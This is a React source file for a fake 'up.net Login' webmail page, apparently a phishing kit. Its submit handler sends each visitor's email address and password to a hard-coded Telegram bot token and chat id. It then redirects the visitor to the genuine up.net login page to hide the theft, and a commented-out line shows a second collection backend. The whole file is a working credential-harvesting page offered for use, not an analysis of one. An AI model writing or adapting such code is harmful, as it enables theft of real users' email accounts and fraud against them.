import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';


function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Up-Net")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
              chat_id: 5868304053,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://webmail.up.net/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.up.net%252Flogin.php%26client_id%3Dwebmail%26nonce%3D068df3e7c9193a040fac4bdae6b69298%26state%3D3e620838d23573701c21ec67ba6c3931%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='text-center my-4'>
            {/* <img  src={catskill} /> */}

            </div>


            <div className='col-md-5 whitediv m-auto   px-0'>
              <div className='py-2 m-0 w-100 px-4'style={{
                backgroundColor:"#fd0000",
                color:"white",
              }}>
                <h4 className=''>up.net Login</h4>

              </div>
                



                <form onSubmit={handleSubmit} className="px-5">

                    <div className='form-group mt-5'>
                        <label className='label'> E-mail address</label>
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} className="form-control"required />

                    </div>


                    <div className='form-group'>
                        <label className='label'> Password</label>
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} className="form-control"required />

                    </div>

                   


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div> */}


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div> */}


                    <div className='form-group text-right'>

<button type='submit' style={{
  backgroundColor:"#fd0000",
}}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>






</div>


                 

                </form>

            </div>
        
        </>
    );
}

export default Home;